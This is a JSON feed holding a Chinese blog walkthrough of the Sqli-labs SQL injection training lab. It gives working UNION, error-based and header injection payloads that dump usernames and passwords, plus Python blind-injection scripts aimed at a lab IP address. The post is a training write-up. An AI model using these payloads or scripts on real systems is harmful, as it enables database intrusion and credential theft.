{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog • All posts by \"sql注入\" category",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "url": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "title": "Sqli-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<h1 id=\"注入语句备忘\"><a href=\"#注入语句备忘\" class=\"headerlink\" title=\"注入语句备忘\"></a>注入语句备忘</h1><ol>\n<li>查库名：<code>select schema_name from information_schema.schemata</code></li>\n<li>查表名：<code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></li>\n<li>查列名：<code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></li>\n<li>查数据：<code>select 列名 from 库名.表名</code><span id=\"more\"></span>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1></li>\n<li>可将用引号包含的库名，表名转换为十六进制，避免引号被过滤</li>\n<li>数据过多时可以利用limit限制数据数量</li>\n<li>同上也可以用<code>concat</code>链接多个数据成为一条返回结果</li>\n<li>…</li>\n</ol>\n<h1 id=\"注入类型判断小技巧\"><a href=\"#注入类型判断小技巧\" class=\"headerlink\" title=\"注入类型判断小技巧\"></a>注入类型判断小技巧</h1><p>1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。</p>\n<p>判断小括号有几种方法：</p>\n<ol>\n<li>2’&amp;&amp;’1’=’1<ul>\n<li>若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。</li>\n<li>若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。</li>\n</ul>\n</li>\n<li>1’)||’1’=(‘1<br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</li>\n</ol>\n<h1 id=\"sqli-labs测试\"><a href=\"#sqli-labs测试\" class=\"headerlink\" title=\"sqli-labs测试\"></a>sqli-labs测试</h1><h2 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h2><ol>\n<li>构造<code>127.0.0.1/Less-1/?id=1</code>成功返回数据</li>\n<li>构造<code>127.0.0.1/Less-1/?id=1&#39;</code>出现报错说明存在注入点</li>\n<li>构造<code>127.0.0.1/Less-1/?id=1&#39; order by 3--+</code>测试有几列</li>\n<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+</code>查看回显点//此时需要令查询的id不存在<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/1.png\" alt=\"sql\"></li>\n<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata)--+</code>查询数据库名。发现报错说数据过多，此时就可以利用limit构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+</code>依次进行查看。<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/2.png\" alt=\"sql\"><br>或者可以利用<code>group_concat</code>构造：<code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/3.png\" alt=\"sql\"></li>\n<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code>查询表名<br>此时‘security’可以用十六进制替换，或者用database()<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/4.png\" alt=\"sql\"></li>\n<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code>查询段名<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/5.png\" alt=\"sql\"></li>\n<li>构造：<code>?id=-1&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+</code>查询数据<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/6.png\" alt=\"sql\"><br>也可以构造：<code>?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+</code>查询数据<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/7.png\" alt=\"sql\"></li>\n</ol>\n<p>至此，sqli-labs的第一关就算是结束了</p>\n<h2 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h2><p>这一关总体和第一关是一样的，只是这里是整型注入，因此不用单引号去闭合，其余操作和第一关相同</p>\n<h2 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h2><p>这一关是利用<code>&#39;)</code>来闭合</p>\n<h2 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h2><p>这一关是利用<code>&quot;)</code>来闭合</p>\n<h2 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h2><p>这关开始就是盲注了，并且通过判断可以得知这是布尔盲注<br>直接丢出脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-5/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\t# print(payload)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\t# print(l)</span><br><span class=\"hljs-string\">\t\tif(l==704):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>这个脚本还是比较偏向手动化的。。。。</p>\n<h2 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h2><p>用<code>&#39;))</code>闭合，但是此时的设定是无论是否正确，返回的数据长度是一样的。此时改变判断方式：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br><br>url = &quot;http://47.96.233.216:8080/Less-7/?id=1&#x27;))&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(test,i,j)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\ttxt = r.text</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\ts = &quot;</span>You are <span class=\"hljs-keyword\">in</span>.... <span class=\"hljs-keyword\">Use</span> outfile......<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\">\t\tif(s in txt):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h2><p>这一关的闭合方式还是单引号，而且好像和第五关没啥差别？？？只要改一下返回数据长度脚本一样是可以用的？？</p>\n<h2 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h2><p>通过测试我们可以发现无论所查询的数据是否存在，都会返回”You are in….“，可以推断这次不是布尔盲注而是时间盲注。丢出时间盲注的脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-9/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):(test,i,j)</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">2</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=2):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h2><p>由于请求方式是post，因此要用BurpSuit抓包，可以发现账号密码处存在注入点<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/8.png\" alt=\"sql\"><br>#Less-12<br>同上，用<code>&quot;)</code>闭合<br>#Less-13<br>可以发现页面没有回显，通过返回图片的不同可以发现是bool盲注，而且时间盲注应该是可以的，但是由于返回的数据包不同点是图片不相同，不能通过判断长度进行布尔盲注，可以用<code>if(s in r.txt)</code>进行判断<br>先放一下脚本：</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\"><span class=\"hljs-built_in\">import</span> requests<br><br><span class=\"hljs-attr\">url</span> = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br><br><span class=\"hljs-attr\">test</span> = <span class=\"hljs-string\">&quot;select database()&quot;</span><br><br><span class=\"hljs-attr\">schema</span> = <span class=\"hljs-string\">&quot;select schema_name from information_schema.schemata limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">table</span> = <span class=\"hljs-string\">&quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;</span><br><br><span class=\"hljs-attr\">column</span> = <span class=\"hljs-string\">&quot;select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">data</span> = <span class=\"hljs-string\">&quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">result</span> = <span class=\"hljs-string\">&quot;&quot;</span><br><br>for i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>):<br>\tfor j <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">48</span>,<span class=\"hljs-number\">122</span>):<br>\t\t<span class=\"hljs-attr\">payload</span> = <span class=\"hljs-string\">&quot;admin&#x27;) and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.format(test,i,j)<br>\t\t<span class=\"hljs-attr\">post_r</span> = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>\t\t<span class=\"hljs-attr\">r</span> = requests.post(url,<span class=\"hljs-attr\">data=post_r)</span><br>\t\t<span class=\"hljs-attr\">l</span> = len(r.text)<br>\t\t<span class=\"hljs-attr\">txt</span> = r.text<br>\t\t<span class=\"hljs-attr\">s</span> = <span class=\"hljs-string\">&quot;../images/flag.jpg&quot;</span><br>\t\t<span class=\"hljs-keyword\">if</span> (s <span class=\"hljs-keyword\">in</span> txt):<br>\t\t\tresult+=chr(j)<br>\t\t\tprint(result)<br>\t\t\tbreak<br></code></pre></td></tr></table></figure>\n<p>以及一个网上找的一个较好的脚本‘<a href=\"https://blog.csdn.net/vhkjhwbs/article/details/98960802%E2%80%99%EF%BC%9A\">https://blog.csdn.net/vhkjhwbs/article/details/98960802’：</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br> <br>chars = <span class=\"hljs-string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&quot;</span><br>result = <span class=\"hljs-string\">&quot;&quot;</span><br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_length</span>(<span class=\"hljs-params\">value</span>):</span>  <span class=\"hljs-comment\">#获取要查询的数据的长度</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">100</span>):<br>        payload = <span class=\"hljs-string\">&quot;admin&#x27;) and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,n)<br>        data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>        html = requests.post(url,data=data)<br>        length = <span class=\"hljs-built_in\">len</span>(html.text)<br>        <span class=\"hljs-keyword\">if</span> length &gt;value:<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;……data length is :&quot;</span> + <span class=\"hljs-built_in\">str</span>(n))<br>            <span class=\"hljs-keyword\">return</span>  n<br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_data</span>(<span class=\"hljs-params\">data_length,value</span>):</span> <span class=\"hljs-comment\">#获取数据</span><br>    <span class=\"hljs-keyword\">global</span> result<br>    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,data_length):<br>        <span class=\"hljs-keyword\">for</span> char <span class=\"hljs-keyword\">in</span> chars:<br>            payload = <span class=\"hljs-string\">&quot;admin&#x27;)and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,i,<span class=\"hljs-built_in\">ord</span>(char))<br>            data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>            html = requests.post(url,data=data)<br>            length = <span class=\"hljs-built_in\">len</span>(html.text)<br>            <span class=\"hljs-keyword\">if</span> length&gt;value:         <span class=\"hljs-comment\">#根据返回长度的不同来判断字符正确与否</span><br>                result += char<br>                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;…… data is :&quot;</span>+ result)<br>                <span class=\"hljs-keyword\">break</span><br> <br> <br>url = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br>data_payload = <span class=\"hljs-string\">&quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&quot;</span><br>value = <span class=\"hljs-number\">1460</span> <br> <br>length = get_length(value) +<span class=\"hljs-number\">1</span><br>get_data(length,value)<br><span class=\"hljs-built_in\">print</span>(result)<br><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h2><p>同第十三关脚本</p>\n<h2 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h2><p>用<code>&quot;)</code>闭合</p>\n<h2 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h2><p>盲猜报错注入</p>\n<h3 id=\"数据类型溢出\"><a href=\"#数据类型溢出\" class=\"headerlink\" title=\"数据类型溢出\"></a>数据类型溢出</h3><p>select exp(~(select*from(select user())x));   # MySQL &lt; 5.5.53<br>pow, cot</p>\n<h3 id=\"几何函数报错\"><a href=\"#几何函数报错\" class=\"headerlink\" title=\"几何函数报错\"></a>几何函数报错</h3><p>select multipoint((select * from (select * from (select version())a)b)); # 低版本<br>geometrycollection multipoint polygon multipolygon linestring multilinestring等</p>\n<h3 id=\"Xpath语法错误\"><a href=\"#Xpath语法错误\" class=\"headerlink\" title=\"Xpath语法错误\"></a>Xpath语法错误</h3><p>select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &gt; 5.1<br>select extractvalue(1,concat(0x3a,(select @@version),0x3a))</p>\n<p>另外当concat被过滤时可以<br>updatexml(1,make_set(3,’’,(select version())),1)</p>\n<h3 id=\"报错注入的几种函数及其用法：\"><a href=\"#报错注入的几种函数及其用法：\" class=\"headerlink\" title=\"报错注入的几种函数及其用法：\"></a>报错注入的几种函数及其用法：</h3><ol>\n<li>floor():<code>select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));</code>group by 对rand()函数进行操作时产生错误</li>\n<li>extractvalue():<code>extractualue(1,concat(0x7e,(select database()),0x7e));</code>XPATH语法错误报错</li>\n<li>updatexml():<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>XPATH语法错误报错</li>\n<li>MYSQL5.7新增：<code>select gtid_subset((select @@version), 2);</code><br>在passwd处存在注入点：<br>payload：<code>11111&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/9.png\" alt=\"sql\"><h2 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h2>可以猜测UA可能存在注入点<br>构造UA<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><h2 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h2>reffer存在注入点，其余同上<h2 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" 